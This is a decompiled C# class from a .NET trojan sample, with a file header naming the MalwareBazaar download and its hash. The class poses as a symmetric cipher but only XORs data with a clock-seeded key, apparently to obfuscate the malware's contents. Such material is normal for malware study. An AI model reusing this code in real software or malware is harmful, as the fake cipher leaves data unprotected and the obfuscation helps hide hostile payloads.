// Decompiled with JetBrains decompiler
// Type: 
// Assembly: 6051378510, Version=3.0.0.207, Culture=neutral, PublicKeyToken=null
// MVID: B4BCA71B-A4B7-F6D8-2B26-148B6DE2A0E1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bsymem.gen-66d5553f6356b491658972e5c5aaccf92cc8863c7e7921be112551e0c9cb25b2.exe

using System;
using System.Security.Cryptography;

internal sealed class \uE009 : SymmetricAlgorithm, ICryptoTransform, IDisposable
{
  private Random \uE002;

  public \uE009()
  {
    this.\uE002 = new Random(DateTime.Now.Millisecond);
    this.LegalKeySizesValue = new KeySizes[1]
    {
      new KeySizes(128, 128, 0)
    };
    this.KeySize = 128;
    this.LegalBlockSizesValue = new KeySizes[1]
    {
      new KeySizes(128, 128, 0)
    };
    this.BlockSize = 128;
  }

  public override ICryptoTransform CreateEncryptor(byte[] _param1, byte[] _param2)
  {
    _param1.CopyTo((Array) this.Key, 0);
    _param2.CopyTo((Array) this.IV, 0);
    return (ICryptoTransform) this;
  }

  public override ICryptoTransform CreateDecryptor(byte[] _param1, byte[] _param2)
  {
    _param1.CopyTo((Array) this.Key, 0);
    _param2.CopyTo((Array) this.IV, 0);
    return (ICryptoTransform) this;
  }

  public override void GenerateIV()
  {
    byte[] buffer = new byte[16];
    this.\uE002.NextBytes(buffer);
    this.IV = buffer;
  }

  public override void GenerateKey()
  {
    byte[] buffer = new byte[16];
    this.\uE002.NextBytes(buffer);
    this.Key = buffer;
  }

  public int TransformBlock(
    byte[] _param1,
    int _param2,
    int _param3,
    byte[] _param4,
    int _param5)
  {
    int length1 = this.Key.Length;
    int length2 = this.IV.Length;
    for (int index = 0; index < _param3; ++index)
    {
      int num = (int) this.IV[index % length2];
      _param4[index + _param5] = (byte) ((uint) _param1[index + _param2] ^ (uint) this.Key[num % length1]);
    }
    return _param3;
  }

  public byte[] TransformFinalBlock(byte[] _param1, int _param2, int _param3)
  {
    byte[] numArray = new byte[_param3];
    this.TransformBlock(_param1, _param2, _param3, numArray, 0);
    return numArray;
  }

  public bool CanReuseTransform => true;

  public bool CanTransformMultipleBlocks => true;

  public int InputBlockSize => 16;

  public int OutputBlockSize => 16;
}
